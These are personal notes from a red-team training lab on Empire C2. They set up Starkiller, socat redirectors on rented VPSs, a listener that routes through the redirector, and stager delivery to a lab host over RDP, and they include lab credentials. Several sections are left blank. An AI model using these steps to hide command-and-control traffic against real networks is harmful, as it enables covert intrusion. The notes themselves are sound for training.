#### Tags: [[12 - Command and Control (TA0011)]]
## Objectives

    Understand the use of redirectors in attack infrastructure
    Create a listener on Empire that will expect redirector routing
    Create stager payloads that will route through the redirector
    Execute the stager payload in the lab environment

## Overview
This lab will focus on the:
- Use of redirectors to create a buffer between the C2 server (Blue Space) and the Target network (Red Space). 
- We will create an account on a Virtual Private Server (VPS) vendor and 
- Provision two VPS's to redirect traffic through.
- Thus, we will leverage Empire C2 stager (Red Space) to perform routing via redirector (Grey Space) to reach the Empire listener (Blue Space).

![[Pasted image 20240310163005.png]]
#### Redirector Communication Pattern
1. C2 Listener will use Redirector IP Address
2. The VPS running Redirector will leverage socat to redirect traffic from Stager (incoming) to Listener (outgoing)
3. C2 Stager will callback to Redirector IP Address
### 1. Launch [[Empire C2#Create an Empire listener|Empire C2 & Setup Communication]]

1. Launch Empire by starting the server 
	1. `sudo ./ps-empire server`
2. Start the StarKiller from the terminal.
	1. `./starkiller-1.9.0.AppImage --no-sandbox`
3. Log into Starkiller UI
	1. `Url: https://localhost:1337 | Username: empireadmin | Password: password123
4. Create certificates for HTTPS, this is optional as Empire normally already has bundled default certificates, but let's do it for good measure.
	1. `cd /opt/Empire/setup/ && ./cert.sh
### 2. Provision VPS
```markdown
# Spawn VPS for redirection:
4-8-15.vpspawn.com with credentials root : 0wnTHEnet!
16-23-42.vpspawn.com with credentials root : ONth3NET?
```
![[Pasted image 20240310165118.png]]

### 3. socat Redirection
1. SSH to your new VPS as root and using one of the passwords provided by vpspawn.com. 
	1. `ssh root@4-8-15.vpspawn.com`
2. Take note of the eth0 adapter's IP, you will need this later.
	1. `ip a`
3. Then create a screen session and run socat using the syntax below:
	1. `screen -S socat443`
	2. `socat TCP4-LISTEN:443,fork TCP4:<C2-IP-Address or Hostname>:443`

Note: The C2 IP addr or hostname can be the value of your tun0 adapter.

Note: The use of screen is a safety mechanism because we can get back to shell that has our socat process if we get disconnected from our redirector.
- To detach from the screen session type` Ctrl+a then d`. 
- To view screen sessions run `screen -ls` 
- To reattach to a detached screen run `screen -r <screen session name>.`

### 4. Create Listener
- Create an Empire listener with a Host set to a redirector address

Click the Create button in the upper right corner of the screen.

Select http in the drop down menu. Then provide the following values:

    Name: interactive-https
    Host: https://10.130.7.5:443 <- This must be the ip address or hostname of the redirector
    Port: 443
    Bind IP: 0.0.0.0
    StagingKey: AddSomethingRandomTo32Characters
    CertPath: /opt/Empire/empire/server/data

Leave the rest as defaults and click the SUBMIT button in the upper right corner of the screen.

###### Note: Listener will have the IP address or hostname of the redirector and not your tun0 adapter. 
- When building a stager - Redirector IP / Host value will be used for communication, you do not want your C2 server's address or hostname here.
#### 5. Create Stager
- Create a stager payload

#### 6. Deliver Stager
- Execute the stager to create an Agent in the target environment via RDP: 
`xfreerdp +clipboard /cert-ignore /u:Gareth.Kilgallen /p:Hu825meapvsAq#Rx /v:wk01.draconem.corp

#### 7. Agent Interaction

```markdown
```

### Conclusion


### Resources | Notes | Bonus

```markdown
```

#### Notes
- Add a link to Empire on how we are leveraging C2 stager to perform routing via redirector to reach the Empire listener





## Conclusion
